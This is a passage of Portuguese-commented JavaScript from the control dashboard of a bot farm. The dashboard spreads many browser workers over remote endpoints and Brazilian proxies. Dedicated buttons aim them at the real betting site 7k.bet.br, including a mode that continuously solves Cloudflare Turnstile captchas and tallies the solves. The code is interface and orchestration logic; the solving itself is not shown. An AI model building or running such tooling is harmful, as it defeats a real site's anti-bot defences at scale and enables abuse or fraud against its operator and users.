                        const defaultWorkers = numWorkersEl ? (parseInt(numWorkersEl.value) || 20) : 20;
                        startBtn.innerHTML = `🚀 Iniciar ${defaultWorkers} Workers`;
                    }
                }
            } catch (error) {
                console.error('Erro em updateServersSummary:', error);
            }
        }
        
        // Atualizar resumo quando os inputs mudarem
        document.addEventListener('input', function(e) {
            try {
                if (e.target.classList.contains('server-endpoint')) {
                    // Quando o endpoint mudar, resetar status e testar novamente
                    const serverCard = e.target.closest('.server-card');
                    if (serverCard) {
                        const serverId = serverCard.id.replace('server-', '');
                        const statusElement = document.getElementById('status-' + serverId);
                        if (statusElement) {
                            // Se não estiver conectado (verde), resetar para pending
                            if (!statusElement.classList.contains('connected')) {
                                statusElement.className = 'server-status pending';
                                statusElement.title = 'Testando conexão...';
                            }
                            // Testar nova conexão após um pequeno delay (debounce)
                            clearTimeout(window.endpointTestTimeout);
                            window.endpointTestTimeout = setTimeout(() => {
                                const newEndpoint = e.target.value.trim();
                                if (newEndpoint) {
                                    // Limpar cache do endpoint antigo (com proxy atual)
                                    const proxyServerEl = document.getElementById('proxy-server');
                                    const proxyServer = proxyServerEl ? proxyServerEl.value : '';
                                    const cacheKey = newEndpoint + '_' + proxyServer;
                                    delete serverStatusCache[cacheKey];
                                    testServerConnection(serverId, newEndpoint);
                                }
                            }, 1000); // Aguardar 1 segundo após parar de digitar
                        }
                    }
                    updateServersSummary();
                } else if (e.target.classList.contains('server-workers-input')) {
                    updateServersSummary();
                }
            } catch (error) {
                console.error('Erro no event listener de input:', error);
            }
        });
        
        // Handler global de erros para evitar que erros quebrem os botões
        window.addEventListener('error', function(event) {
            console.error('Erro JavaScript capturado:', event.error);
            addLog('⚠️ Erro JavaScript: ' + (event.error?.message || 'Erro desconhecido'), 'error');
            // Não impedir que os botões funcionem
            return true;
        });
        
        // Handler para promises rejeitadas não tratadas
        window.addEventListener('unhandledrejection', function(event) {
            console.error('Promise rejeitada não tratada:', event.reason);
            addLog('⚠️ Erro de promise: ' + (event.reason?.message || String(event.reason)), 'error');
        });
        
        async function loadConfig() {
            try {
                const response = await fetch('/api/load-config');
                const result = await response.json();
                
                if (result.status === 'success' && result.config) {
                    const config = result.config;
                    if (config.ws_endpoint) document.getElementById('ws-endpoint').value = config.ws_endpoint;
                    if (config.proxy_server) document.getElementById('proxy-server').value = config.proxy_server;
                    if (config.proxy_username) document.getElementById('proxy-username').value = config.proxy_username;
                    if (config.proxy_password) document.getElementById('proxy-password').value = config.proxy_password;
                    if (config.default_url) document.getElementById('url-input').value = config.default_url;
                    if (config.default_workers) document.getElementById('num-workers').value = config.default_workers;
                    if (config.use_proxy !== undefined) document.getElementById('use-proxy').checked = config.use_proxy;
                    
                    addLog('✅ Configuração carregada automaticamente!', 'success');
                } else {
                    // Sem arquivo salvo - garantir valores padrão
                    setDefaultValues();
                    console.log('Usando valores padrão do dashboard.');
                }
            } catch (error) {
                // Sem arquivo salvo - garantir valores padrão
                setDefaultValues();
                console.log('Usando valores padrão do dashboard.');
            }
        }
        
        async function startWorkers() {
            // Prevenir múltiplas execuções simultâneas
            if (isRunning) {
                addLog('⚠️ Workers já estão em execução!', 'warning');
                return;
            }
            
            let url = document.getElementById('url-input').value.trim();
            const useProxy = document.getElementById('use-proxy').checked;
            const proxyServer = document.getElementById('proxy-server').value;
            const proxyUsername = document.getElementById('proxy-username').value;
            const proxyPassword = document.getElementById('proxy-password').value;
            
            if (!url) {
                addLog('Digite uma URL!', 'error');
                return;
            }
            
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'https://' + url;
                document.getElementById('url-input').value = url;
            }
            
            // Verificar se há servidores múltiplos configurados
            const servers = getServers();
            let numWorkers = 0;
            
            // Validar se há servidores conectados
            if (servers.length === 0) {
                const totalServerCards = document.querySelectorAll('.server-card').length;
                if (totalServerCards > 0) {
                    addLog('❌ Nenhum servidor conectado (status verde)! Aguarde os testes de conexão terminarem ou verifique os servidores.', 'error');
                    return;
                }
            }
            
            if (servers.length > 0) {
                // Usar servidores múltiplos (apenas os com status verde)
                numWorkers = servers.reduce((sum, s) => sum + s.workers, 0);
                
                // Contar total de servidores configurados para comparar
                const totalServerCards = document.querySelectorAll('.server-card').length;
                const skippedServers = totalServerCards - servers.length;
                
                if (skippedServers > 0) {
                    addLog(`✅ Usando apenas ${servers.length} servidor(es) conectados (${skippedServers} não conectados foram ignorados)`, 'success');
                } else {
                    addLog(`📊 Usando ${servers.length} servidor(es) com ${numWorkers} workers total`, 'info');
                }
                
                // Mostrar detalhes de forma resumida (não bloquear envio)
                if (servers.length <= 5) {
                    servers.forEach((server, index) => {
                        addLog(`🖥️ Servidor ${index + 1}: ${server.endpoint} (${server.workers} workers)`, 'info');
                    });
                } else {
                    addLog(`🖥️ ${servers.length} servidores configurados`, 'info');
                }
            } else {
                // Usar servidor único padrão
                numWorkers = parseInt(document.getElementById('num-workers').value) || 20;
                let wsEndpoint = document.getElementById('ws-endpoint').value;
                if (!wsEndpoint || wsEndpoint.trim() === '') {
                    addLog('❌ Configure o endpoint WebSocket primeiro!', 'error');
                    return;
                }
                // Adicionar timeout ao endpoint
                wsEndpoint = adicionarTimeoutAoEndpoint(wsEndpoint);
                servers.push({
                    endpoint: wsEndpoint,
                    workers: numWorkers
                });
            }
            
            if (numWorkers === 0) {
                addLog('❌ Configure pelo menos um servidor com workers!', 'error');
                return;
            }
            
            isRunning = true;
            startTime = Date.now();
            
            // Atualizar estado dos botões IMEDIATAMENTE
            const startBtn = document.getElementById('start-btn');
            const start7kBtn = document.getElementById('start-7k-btn');
            const startCaptchaBtn = document.getElementById('start-captcha-btn');
            const stopBtn = document.getElementById('stop-btn');
            if (startBtn) startBtn.style.display = 'none';
            if (start7kBtn) start7kBtn.style.display = 'none';
            if (startCaptchaBtn) startCaptchaBtn.style.display = 'none';
            if (stopBtn) stopBtn.style.display = 'inline-flex';
            const progressContainer = document.getElementById('progress-container');
            if (progressContainer) progressContainer.style.display = 'block';
            
            // Iniciar fetch ANTES de criar cards (não bloquear envio)
            addLog('🚀 Iniciando ' + numWorkers + ' workers para: ' + url, 'info');
            statusInterval = setInterval(updateStats, 500);
            
            // Criar cards de forma assíncrona (não bloquear o fetch)
            setTimeout(() => {
                createWorkerCards(numWorkers);
            }, 0);
            
            try {
                // Enviar requisição IMEDIATAMENTE (sem esperar criação de cards)
                const response = await fetch('/api/run-workers', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        url: url, 
                        servers: servers,
                        use_proxy: useProxy,
                        proxy_server: proxyServer,
                        proxy_username: proxyUsername,
                        proxy_password: proxyPassword
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Erro ao iniciar workers: ' + response.status);
                }
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    
                    const text = decoder.decode(value);
                    const lines = text.split('\\n').filter(l => l.trim());
                    
                    for (const line of lines) {
                        try {
                            const data = JSON.parse(line);
                            
                            if (data.type === 'worker_start') {
                                const endpoint = data.endpoint || 'N/A';
                                updateWorkerCard(data.worker_id, 'running', 'Conectando...');
                                addLog('🔄 Worker #' + data.worker_id + ' iniciado - conectando ao servidor: ' + endpoint, 'info');
                            }
                            else if (data.type === 'worker_result') {
                                const w = workers.find(x => x.id === data.worker_id);
                                if (w) {
                                    w.status = data.success ? 'success' : 'error';
                                    w.ip = data.ip || '';
                                    w.details = data.details || '';
                                    w.title = data.title || '';
                                }
                                
                                // Se sucesso, mostrar conteúdo da resposta ao invés do IP
                                let contentToShow = '';
                                if (data.success) {
                                    if (data.response_preview) {
                                        // Limpar e mostrar preview do conteúdo (primeiros 200 chars)
                                        contentToShow = data.response_preview
                                            .replace(/\s+/g, ' ')  // Múltiplos espaços em um
                                            .trim()
                                            .substring(0, 200);
                                        if (data.response_preview.length > 200) {
                                            contentToShow += '...';
                                        }
                                    } else if (data.response_content) {
                                        // Se não tem preview, extrair texto do HTML
                                        const textContent = data.response_content
                                            .replace(/<[^>]+>/g, ' ')  // Remove tags HTML
                                            .replace(/\s+/g, ' ')     // Múltiplos espaços em um
                                            .trim()
                                            .substring(0, 200);
                                        contentToShow = textContent + (data.response_content.length > 200 ? '...' : '');
                                    }
                                }
                                
                                // Passar título separadamente para aparecer primeiro no card
                                const locInfo = data.location ? ' | ' + data.location : '';
                                const proxyIcon = data.proxy_used ? '🇧🇷 ' : '';
                                const cardDetails = proxyIcon + (data.details || data.error || '') + locInfo;
                                
                                // Se sucesso, passar conteúdo; se erro, passar IP
                                const displayContent = data.success ? contentToShow : (data.ip || '');
                                
                                updateWorkerCard(
                                    data.worker_id, 
                                    data.success ? 'success' : 'error',
                                    cardDetails,
                                    displayContent,  // Conteúdo ao invés de IP quando sucesso
                                    data.title || ''  // Título passado separadamente para aparecer primeiro
                                );
                                
                                if (data.success) {
                                    const proxyTag = data.proxy_used ? '🇧🇷' : '☁️';
                                    const loc = data.location ? ' | ' + data.location : '';
                                    const status = data.status_code ? ' | HTTP ' + data.status_code : '';
                                    const endpoint = data.endpoint ? ' | Endpoint: ' + data.endpoint : '';
                                    
                                    // Mostrar URL de forma destacada
                                    if (data.url) {
                                        addLog('🌐 Worker #' + data.worker_id + ' Acessando: ' + data.url, 'info');
                                    }
                                    
                                    // Mostrar título de forma destacada
                                    if (data.title) {
                                        addLog('📌 Worker #' + data.worker_id + ' Título: ' + data.title, 'success');
                                    }
                                    
                                    addLog(proxyTag + ' Worker #' + data.worker_id + ' ✅ SUCESSO | IP: ' + (data.ip || 'N/A') + loc + status + endpoint, 'success');
                                    
                                    // Mostrar preview do conteúdo retornado
                                    if (data.response_preview) {
                                        const preview = data.response_preview.replace(/\\n/g, ' ').substring(0, 300);
                                        addLog('   📄 Worker #' + data.worker_id + ' Preview do conteúdo (' + (data.response_preview.length > 300 ? '300/' + data.response_preview.length : data.response_preview.length) + ' chars):', 'info');
                                        addLog('      ' + preview + (data.response_preview.length > 300 ? '...' : ''), 'info');
                                    }
                                    
                                    // Mostrar tamanho completo
                                    if (data.response_content) {
                                        const size = data.response_content.length;
                                        addLog('   📦 Worker #' + data.worker_id + ' Tamanho total da resposta: ' + size.toLocaleString() + ' bytes', 'info');
                                    }
                                    
                                    if (data.duration) {
                                        addLog('   ⏱️ Worker #' + data.worker_id + ' Tempo de execução: ' + data.duration + 's', 'info');
                                    }
                                } else {
                                    const endpoint = data.endpoint ? ' | Endpoint: ' + data.endpoint : '';
                                    
                                    // Mostrar URL mesmo em caso de erro
                                    if (data.url) {
                                        addLog('🌐 Worker #' + data.worker_id + ' Tentando acessar: ' + data.url, 'warning');
                                    }
                                    
                                    addLog('❌ Worker #' + data.worker_id + ' FALHOU: ' + (data.error || 'Erro') + endpoint, 'error');
                                    if (data.error) {
                                        addLog('   ⚠️ Detalhes do erro: ' + data.error, 'error');
                                    }
                                }
                            }
                            else if (data.type === 'complete') {
                                addLog('🏁 Concluído! Sucesso: ' + data.success + ' | Falhas: ' + data.fail + ' | Tempo: ' + data.elapsed + 's', 'success');
                            }
                        } catch(e) {
                            console.error('Erro ao processar linha:', e, line);
                        }
                    }
                }
            } catch (error) {
                addLog('❌ Erro: ' + error.message, 'error');
                console.error('Erro em startWorkers:', error);
            } finally {
                // SEMPRE restaurar estado dos botões, mesmo em caso de erro
                finishExecution();
            }
        }
        
        async function startWorkers7k() {
            // Prevenir múltiplas execuções simultâneas
            if (isRunning) {
                addLog('⚠️ Workers já estão em execução!', 'warning');
                return;
            }
            
            // Configurar URL para 7k.bet.br
            const url = 'https://7k.bet.br';
            document.getElementById('url-input').value = url;
            
            const useProxy = document.getElementById('use-proxy').checked;
            const proxyServer = document.getElementById('proxy-server').value;
            const proxyUsername = document.getElementById('proxy-username').value;
            const proxyPassword = document.getElementById('proxy-password').value;
            
            // Verificar se há servidores múltiplos configurados
            const servers = getServers();
            let numWorkers = 0;
            
            // Validar se há servidores conectados
            if (servers.length === 0) {
                const totalServerCards = document.querySelectorAll('.server-card').length;
                if (totalServerCards > 0) {
                    addLog('❌ Nenhum servidor conectado (status verde)! Aguarde os testes de conexão terminarem ou verifique os servidores.', 'error');
                    return;
                }
            }
            
            if (servers.length > 0) {
                // Usar servidores múltiplos (apenas os com status verde)
                numWorkers = servers.reduce((sum, s) => sum + s.workers, 0);
                
                const totalServerCards = document.querySelectorAll('.server-card').length;
                const skippedServers = totalServerCards - servers.length;
                
                if (skippedServers > 0) {
                    addLog(`✅ Usando apenas ${servers.length} servidor(es) conectados (${skippedServers} não conectados foram ignorados)`, 'success');
                } else {
                    addLog(`📊 Usando ${servers.length} servidor(es) com ${numWorkers} workers total`, 'info');
                }
                
                if (servers.length <= 5) {
                    servers.forEach((server, index) => {
                        addLog(`🖥️ Servidor ${index + 1}: ${server.endpoint} (${server.workers} workers)`, 'info');
                    });
                } else {
                    addLog(`🖥️ ${servers.length} servidores configurados`, 'info');
                }
            } else {
                // Usar servidor único padrão
                numWorkers = parseInt(document.getElementById('num-workers').value) || 20;
                let wsEndpoint = document.getElementById('ws-endpoint').value;
                if (!wsEndpoint || wsEndpoint.trim() === '') {
                    addLog('❌ Configure o endpoint WebSocket primeiro!', 'error');
                    return;
                }
                // Adicionar timeout ao endpoint
                wsEndpoint = adicionarTimeoutAoEndpoint(wsEndpoint);
                servers.push({
                    endpoint: wsEndpoint,
                    workers: numWorkers
                });
            }
            
            if (numWorkers === 0) {
                addLog('❌ Configure pelo menos um servidor com workers!', 'error');
                return;
            }
            
            isRunning = true;
            startTime = Date.now();
            
            // Atualizar estado dos botões IMEDIATAMENTE
            const startBtn = document.getElementById('start-btn');
            const start7kBtn = document.getElementById('start-7k-btn');
            const startCaptchaBtn = document.getElementById('start-captcha-btn');
            const stopBtn = document.getElementById('stop-btn');
            if (startBtn) startBtn.style.display = 'none';
            if (start7kBtn) start7kBtn.style.display = 'none';
            if (startCaptchaBtn) startCaptchaBtn.style.display = 'none';
            if (stopBtn) stopBtn.style.display = 'inline-flex';
            const progressContainer = document.getElementById('progress-container');
            if (progressContainer) progressContainer.style.display = 'block';
            
            // Iniciar fetch ANTES de criar cards
            addLog('🎰 Iniciando ' + numWorkers + ' workers no modo 7k para: ' + url, 'info');
            statusInterval = setInterval(updateStats, 500);
            
            // Criar cards de forma assíncrona
            setTimeout(() => {
                createWorkerCards(numWorkers);
            }, 0);
            
            try {
                // Enviar requisição com mode_7k: true
                const response = await fetch('/api/run-workers', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        url: url, 
                        servers: servers,
                        use_proxy: useProxy,
                        proxy_server: proxyServer,
                        proxy_username: proxyUsername,
                        proxy_password: proxyPassword,
                        mode_7k: true  // Ativar modo 7k
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Erro ao iniciar workers: ' + response.status);
                }
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    
                    const text = decoder.decode(value);
                    const lines = text.split('\\n').filter(l => l.trim());
                    
                    for (const line of lines) {
                        try {
                            const data = JSON.parse(line);
                            
                            if (data.type === 'worker_start') {
                                const endpoint = data.endpoint || 'N/A';
                                updateWorkerCard(data.worker_id, 'running', 'Conectando...');
                                addLog('🔄 Worker #' + data.worker_id + ' iniciado (modo 7k) - conectando ao servidor: ' + endpoint, 'info');
                            }
                            else if (data.type === 'worker_result') {
                                const w = workers.find(x => x.id === data.worker_id);
                                if (w) {
                                    w.status = data.success ? 'success' : 'error';
                                    w.ip = data.ip || '';
                                    w.details = data.details || '';
                                    w.title = data.title || '';
                                }
                                
                                let contentToShow = '';
                                if (data.success) {
                                    if (data.response_preview) {
                                        contentToShow = data.response_preview
                                            .replace(/\s+/g, ' ')
                                            .trim()
                                            .substring(0, 200);
                                        if (data.response_preview.length > 200) {
                                            contentToShow += '...';
                                        }
                                    } else if (data.response_content) {
                                        const textContent = data.response_content
                                            .replace(/<[^>]+>/g, ' ')
                                            .replace(/\s+/g, ' ')
                                            .trim()
                                            .substring(0, 200);
                                        contentToShow = textContent + (data.response_content.length > 200 ? '...' : '');
                                    }
                                }
                                
                                const locInfo = data.location ? ' | ' + data.location : '';
                                const proxyIcon = data.proxy_used ? '🇧🇷 ' : '';
                                const cardDetails = proxyIcon + (data.details || data.error || '') + locInfo;
                                
                                const displayContent = data.success ? contentToShow : (data.ip || '');
                                
                                updateWorkerCard(
                                    data.worker_id, 
                                    data.success ? 'success' : 'error',
                                    cardDetails,
                                    displayContent,
                                    data.title || ''
                                );
                                
                                if (data.success) {
                                    const proxyTag = data.proxy_used ? '🇧🇷' : '☁️';
                                    const loc = data.location ? ' | ' + data.location : '';
                                    addLog('🎰 ' + proxyTag + ' Worker #' + data.worker_id + ' ✅ SUCESSO (modo 7k) | IP: ' + (data.ip || 'N/A') + loc, 'success');
                                } else {
                                    addLog('❌ Worker #' + data.worker_id + ' FALHOU (modo 7k): ' + (data.error || 'Erro'), 'error');
                                }
                            }
                            else if (data.type === 'complete') {
                                addLog('🏁 Concluído! Sucesso: ' + data.success + ' | Falhas: ' + data.fail + ' | Tempo: ' + data.elapsed + 's', 'success');
                            }
                        } catch(e) {
                            console.error('Erro ao processar linha:', e, line);
                        }
                    }
                }
            } catch (error) {
                addLog('❌ Erro: ' + error.message, 'error');
                console.error('Erro em startWorkers7k:', error);
            } finally {
                // SEMPRE restaurar estado dos botões, mesmo em caso de erro
                finishExecution();
            }
        }
        
        async function startWorkersCaptcha() {
            // Prevenir múltiplas execuções simultâneas
            if (isRunning) {
                addLog('⚠️ Workers já estão em execução!', 'warning');
                return;
            }
            
            // Configurar URL para 7k.bet.br (Turnstile)
            const url = 'https://7k.bet.br';
            document.getElementById('url-input').value = url;
            
            const useProxy = document.getElementById('use-proxy').checked;
            const proxyServer = document.getElementById('proxy-server').value;
            const proxyUsername = document.getElementById('proxy-username').value;
            const proxyPassword = document.getElementById('proxy-password').value;
            
            // Verificar se há servidores múltiplos configurados
            const servers = getServers();
            let numWorkers = 0;
            
            // Validar se há servidores conectados
            if (servers.length === 0) {
                const totalServerCards = document.querySelectorAll('.server-card').length;
                if (totalServerCards > 0) {
                    addLog('❌ Nenhum servidor conectado (status verde)! Aguarde os testes de conexão terminarem ou verifique os servidores.', 'error');
                    return;
                }
            }
            
            if (servers.length > 0) {
                // Usar servidores múltiplos (apenas os com status verde)
                numWorkers = servers.reduce((sum, s) => sum + s.workers, 0);
                
                const totalServerCards = document.querySelectorAll('.server-card').length;
                const skippedServers = totalServerCards - servers.length;
                
                if (skippedServers > 0) {
                    addLog(`✅ Usando apenas ${servers.length} servidor(es) conectados (${skippedServers} não conectados foram ignorados)`, 'success');
                } else {
                    addLog(`📊 Usando ${servers.length} servidor(es) com ${numWorkers} workers total`, 'info');
                }
            } else {
                // Usar servidor único padrão
                numWorkers = parseInt(document.getElementById('num-workers').value) || 20;
                let wsEndpoint = document.getElementById('ws-endpoint').value;
                if (!wsEndpoint || wsEndpoint.trim() === '') {
                    addLog('❌ Configure o endpoint WebSocket primeiro!', 'error');
                    return;
                }
                // Adicionar timeout ao endpoint
                wsEndpoint = adicionarTimeoutAoEndpoint(wsEndpoint);
                servers.push({
                    endpoint: wsEndpoint,
                    workers: numWorkers
                });
            }
            
            if (numWorkers === 0) {
                addLog('❌ Configure pelo menos um servidor com workers!', 'error');
                return;
            }
            
            isRunning = true;
            startTime = Date.now();
            
            // Atualizar estado dos botões IMEDIATAMENTE
            const startBtn = document.getElementById('start-btn');
            const start7kBtn = document.getElementById('start-7k-btn');
            const startCaptchaBtn = document.getElementById('start-captcha-btn');
            const stopBtn = document.getElementById('stop-btn');
            if (startBtn) startBtn.style.display = 'none';
            if (start7kBtn) start7kBtn.style.display = 'none';
            if (startCaptchaBtn) startCaptchaBtn.style.display = 'none';
            if (stopBtn) stopBtn.style.display = 'inline-flex';
            const progressContainer = document.getElementById('progress-container');
            if (progressContainer) progressContainer.style.display = 'block';
            
            // Iniciar fetch ANTES de criar cards
            addLog('🔐 Iniciando ' + numWorkers + ' workers no modo CAPTCHA (Turnstile Solver)', 'info');
            addLog('🔐 Cada worker vai resolver captchas continuamente até clicar em Parar', 'info');
            statusInterval = setInterval(updateStats, 500);
            
            // Criar cards de forma assíncrona
            setTimeout(() => {
                createWorkerCards(numWorkers);
            }, 0);
            
            // Poll para atualizar estatísticas de captcha
            const captchaStatsInterval = setInterval(async () => {
                try {
                    const response = await fetch('/api/captcha-stats');
                    const stats = await response.json();
                    if (stats.success) {
                        const statCaptcha = document.getElementById('stat-captcha');
                        if (statCaptcha) {
                            statCaptcha.textContent = stats.solved;
                        }
                    }
                } catch (e) {
                    // Silenciar erros de polling
                }
            }, 1000);
            
            try {
                // Enviar requisição com mode_captcha: true
                const response = await fetch('/api/run-workers', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        url: url, 
                        servers: servers,
                        use_proxy: useProxy,
                        proxy_server: proxyServer,
                        proxy_username: proxyUsername,
                        proxy_password: proxyPassword,
                        mode_captcha: true  // Ativar modo captcha
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Erro ao iniciar workers: ' + response.status);
                }
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    
                    const text = decoder.decode(value);
                    const lines = text.split('\\n').filter(l => l.trim());
                    
                    for (const line of lines) {
                        try {
                            const data = JSON.parse(line);
                            
                            if (data.type === 'worker_start') {
                                const endpoint = data.endpoint || 'N/A';
                                updateWorkerCard(data.worker_id, 'running', 'Resolvendo Turnstile...');
                                addLog('🔐 Worker #' + data.worker_id + ' iniciado (modo Captcha) - conectando ao servidor: ' + endpoint, 'info');
                            }
                            else if (data.type === 'captcha_solved') {
                                // Evento específico de captcha resolvido
                                const statCaptcha = document.getElementById('stat-captcha');
                                if (statCaptcha) {
                                    statCaptcha.textContent = data.total_solved || (parseInt(statCaptcha.textContent) + 1);
                                }
                                addLog('🔐 ✅ Worker #' + data.worker_id + ' CAPTCHA RESOLVIDO #' + data.solve_count + ' em ' + data.time + 's (Total: ' + data.total_solved + ')', 'success');
                            }
                            else if (data.type === 'captcha_reload') {
                                addLog('🔐 ⟳ Worker #' + data.worker_id + ' Timeout - recarregando...', 'warning');
                            }
                            else if (data.type === 'worker_result') {
                                const w = workers.find(x => x.id === data.worker_id);
                                if (w) {
                                    w.status = data.success ? 'success' : 'error';
                                    w.ip = data.ip || '';
                                    w.details = data.details || '';
                                    w.title = data.title || '';
                                }
                                
                                let contentToShow = '';
                                if (data.success && data.captcha_solved) {
                                    contentToShow = '🔐 ' + data.captcha_solved + ' captchas resolvidos';
                                }
                                
                                const locInfo = data.location ? ' | ' + data.location : '';
                                const proxyIcon = data.proxy_used ? '🇧🇷 ' : '';
                                const cardDetails = proxyIcon + (data.details || data.error || '') + locInfo;
                                
                                const displayContent = data.success ? contentToShow : (data.ip || '');
                                
                                updateWorkerCard(
                                    data.worker_id, 
                                    data.success ? 'success' : 'error',
                                    cardDetails,
                                    displayContent,
                                    data.title || 'Turnstile Solver'
                                );
                                
                                if (data.success) {
                                    const proxyTag = data.proxy_used ? '🇧🇷' : '☁️';
                                    const loc = data.location ? ' | ' + data.location : '';
                                    addLog('🔐 ' + proxyTag + ' Worker #' + data.worker_id + ' ✅ FINALIZADO | Captchas: ' + (data.captcha_solved || 0) + loc, 'success');
                                } else {
                                    addLog('❌ Worker #' + data.worker_id + ' FALHOU (modo Captcha): ' + (data.error || 'Erro'), 'error');
                                }
                            }
                            else if (data.type === 'complete') {
                                addLog('🏁 Concluído! Captchas Totais: ' + (data.captcha_total || 0) + ' | Tempo: ' + data.elapsed + 's', 'success');
                            }
                        } catch(e) {
                            console.error('Erro ao processar linha:', e, line);
                        }
                    }
                }
            } catch (error) {
                addLog('❌ Erro: ' + error.message, 'error');
                console.error('Erro em startWorkersCaptcha:', error);
            } finally {
                // SEMPRE restaurar estado dos botões, mesmo em caso de erro
                clearInterval(captchaStatsInterval);
                finishExecution();
            }
        }
        
        function finishExecution() {
            try {
                isRunning = false;
                if (statusInterval) {
                    clearInterval(statusInterval);
                    statusInterval = null;
                }
                updateStats();
                
                // Restaurar botões com verificação de existência
                const startBtn = document.getElementById('start-btn');
                const start7kBtn = document.getElementById('start-7k-btn');
                const startCaptchaBtn = document.getElementById('start-captcha-btn');
                const stopBtn = document.getElementById('stop-btn');
                if (startBtn) {
                    startBtn.style.display = 'inline-flex';
                    startBtn.disabled = false;
                }
                if (start7kBtn) {
                    start7kBtn.style.display = 'inline-flex';
                    start7kBtn.disabled = false;
                }
                if (startCaptchaBtn) {
                    startCaptchaBtn.style.display = 'inline-flex';
                    startCaptchaBtn.disabled = false;
                }
                if (stopBtn) {
                    stopBtn.style.display = 'none';
                }
            } catch (error) {
                console.error('Erro em finishExecution:', error);
            }
        }
        
        function stopWorkers() {
            if (!isRunning) {
                addLog('⚠️ Nenhum worker em execução!', 'warning');
                return;
            }
            try {
                fetch('/api/stop-workers', { method: 'POST' }).catch(err => {
                    console.error('Erro ao parar workers:', err);
                });
                addLog('⏹️ Parando workers...', 'warning');
                finishExecution();
            } catch (error) {
                console.error('Erro em stopWorkers:', error);
                finishExecution();
            }
        }
        
        // Event listener para num-workers com proteção
        const numWorkersEl = document.getElementById('num-workers');
        if (numWorkersEl) {
            numWorkersEl.addEventListener('change', function() {
                try {
                    const startBtn = document.getElementById('start-btn');
                    if (startBtn) {
                        startBtn.innerHTML = '🚀 Iniciar ' + this.value + ' Workers';
                    }
                } catch (error) {
                    console.error('Erro no event listener de num-workers:', error);
                }
            });
        }
        
        // Garantir valores padrão e carregar configuração salva ao iniciar a página
        try {
            setDefaultValues();
            loadConfig();
            loadLogsStatus();
        } catch (error) {
            console.error('Erro ao inicializar:', error);
        }
        
        // Inicializar com um servidor padrão se não houver nenhum
        setTimeout(() => {
            try {
                const servers = getServers();
                if (servers.length === 0) {
                    addServer();
                }
                updateServersSummary();
            } catch (error) {
                console.error('Erro ao inicializar servidor padrão:', error);
            }
        }, 100);
        
        // Função para visualizar simulação do worker
        async function viewWorkerSimulation(workerId) {
            try {
                const response = await fetch(`/api/worker-screenshot/${workerId}`);
                const data = await response.json();
                
                if (data.success && data.screenshot) {
                    // Criar ou atualizar modal
                    let modal = document.getElementById('screenshot-modal');
                    if (!modal) {
                        modal = document.createElement('div');
                        modal.id = 'screenshot-modal';
                        modal.className = 'screenshot-modal';
                        modal.innerHTML = `
                            <div class="screenshot-modal-content">
                                <div class="screenshot-modal-header">
                                    <h2 class="screenshot-modal-title">Simulação Worker #${workerId}</h2>
                                    <button class="screenshot-modal-close" onclick="closeScreenshotModal()">✕ Fechar</button>
                                </div>
                                <div class="screenshot-container">
                                    <img id="screenshot-image" class="screenshot-image" src="" alt="Screenshot do Worker">
                                </div>
                                <div class="screenshot-info" id="screenshot-info"></div>
                            </div>
                        `;
                        document.body.appendChild(modal);
                        
                        // Fechar ao clicar fora do modal
                        modal.addEventListener('click', function(e) {
                            if (e.target === modal) {
                                closeScreenshotModal();
                            }
                        });
                    }
                    
                    // Atualizar conteúdo do modal
                    const img = document.getElementById('screenshot-image');
                    const info = document.getElementById('screenshot-info');
                    const title = modal.querySelector('.screenshot-modal-title');
                    
                    if (img) {
                        img.src = 'data:image/png;base64,' + data.screenshot;
                    }
                    
                    if (title) {
                        title.textContent = `Simulação Worker #${workerId}`;
                    }
                    
                    if (info) {
                        const timestamp = new Date(data.timestamp * 1000).toLocaleString('pt-BR');
                        info.innerHTML = `
                            <div class="screenshot-info-item"><strong>URL:</strong> ${data.url || 'N/A'}</div>
                            <div class="screenshot-info-item"><strong>Título:</strong> ${data.title || 'N/A'}</div>
                            <div class="screenshot-info-item"><strong>Capturado em:</strong> ${timestamp}</div>
                        `;
                    }
                    
                    // Mostrar modal
                    modal.classList.add('active');
                } else {
                    addLog(`❌ Screenshot não disponível para Worker #${workerId}`, 'warning');
                }
            } catch (error) {
                console.error('Erro ao buscar screenshot:', error);
                addLog(`❌ Erro ao carregar simulação: ${error.message}`, 'error');
            }
        }
        
        function closeScreenshotModal() {
            const modal = document.getElementById('screenshot-modal');
            if (modal) {
                modal.classList.remove('active');
            }
        }
        
        // Fechar modal com ESC
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeScreenshotModal();
            }
        });
        
        // Inicializar preview do timeout ao carregar a página
        document.addEventListener('DOMContentLoaded', function() {
            atualizarTimeoutPreview();
        });
        
        // Se o DOM já estiver carregado, executar imediatamente
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', atualizarTimeoutPreview);
        } else {
            atualizarTimeoutPreview();
        }
        
        // Função para ativar/desativar captura de screenshots
        async function toggleScreenshots(enabled) {
            try {
                const response = await fetch('/api/toggle-screenshots', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: enabled })
                });
                
                const data = await response.json();
                if (data.success) {
                    const status = enabled ? 'ativada' : 'desativada';
                    const icon = enabled ? '📸' : '🚫';
                    addLog(`${icon} Captura de screenshots ${status}. Workers serão mais ${enabled ? 'lentos' : 'rápidos'}.`, enabled ? 'info' : 'warning');
                }
            } catch (error) {
                console.error('Erro ao alternar screenshots:', error);
                addLog('❌ Erro ao alternar captura de screenshots: ' + error.message, 'error');
            }
        }
        
        // Carregar estado inicial da captura de screenshots
        async function loadScreenshotsEnabled() {
            try {
                const response = await fetch('/api/screenshots-enabled');
                const data = await response.json();
                if (data.success) {
                    const checkbox = document.getElementById('capture-screenshots');
                    if (checkbox) {
                        checkbox.checked = data.enabled;
                    }
